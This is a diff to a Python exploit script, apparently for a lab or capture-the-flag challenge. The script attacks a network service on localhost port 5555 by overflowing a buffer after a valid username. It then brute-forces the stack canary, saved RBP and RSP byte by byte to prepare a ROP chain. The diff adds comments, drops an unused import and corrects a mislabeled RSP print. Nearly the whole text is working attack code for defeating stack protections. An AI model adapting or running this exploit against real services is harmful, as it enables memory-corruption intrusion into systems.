@@ -1,7 +1,6 @@
 import sys
 import socket
 import struct
-import binascii
 
 _Host = 'localhost'
 _Port = 5555
@@ -25,7 +24,7 @@ def xor_me(_buffer):
 	_to_return = bytearray(len(_buffer))
 	for index in range(0, len(_buffer)):
 		_to_return[index] = _buffer[index] ^ 0x0d
-		
+
 	return _to_return
 
 def brute_force(_Payload):
@@ -60,27 +59,31 @@ def brute_force(_Payload):
 def main():
 	_Payload = _Correct_User + "A".encode("utf-8") * 1024
 
+	## find canary and add it to the payload
 	_canary = brute_force(_Payload)
 	_Payload += _canary
 	_canary_hex = xor_me(reverse(_canary)).hex()
 	print("[+] Canary found: {0}".format(_canary_hex))
 
+	## find RBP - used to calculate stack offset
 	_RBP = brute_force(_Payload)	
 	_RBP_hex = xor_me(reverse(_RBP)).hex()
 	print("[+] RBP found: {0}".format(_RBP_hex))
 
+	## find RSP - used to calculate ROP offset
 	_RSP = brute_force(_Payload + _RBP)	
 	_RSP_hex = xor_me(reverse(_RSP)).hex()
-	print("[+] RBP found: {0}".format(_RSP_hex))
+	print("[+] RSP found: {0}".format(_RSP_hex))
 
+	## test run - should result in "Username found!"
 	mySock = connect()
 	recv = mySock.recv(1024)
 	mySock.send(_Payload)
 	recv = mySock.recv(1024)
 	print(recv.decode("utf-8"))
 
+	## end
 	mySock.close()
-
 	return 0
 
 if __name__ == '__main__':
